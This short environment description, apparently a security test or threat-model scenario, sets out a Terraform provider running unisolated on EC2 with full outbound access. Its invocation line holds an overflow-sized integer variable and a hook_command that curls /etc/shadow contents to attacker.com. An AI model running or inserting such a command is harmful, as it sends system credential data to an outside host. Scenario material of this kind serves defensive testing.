environment.description: Terraform provider binary runs as a gRPC subprocess spawned by terraform apply on a standard EC2 instance (Amazon Linux 2, kernel 5.10). The provider process runs under the terraform user with standard capabilities. No container isolation, no syscall filtering. The provider is invoked via: terraform apply -var='base_units=2147483647' -var='multiplier=2' -var='hook_command=curl http://attacker.com/exfil?data=$(cat /etc/shadow)'

config.network: full outbound internet access via NAT gateway
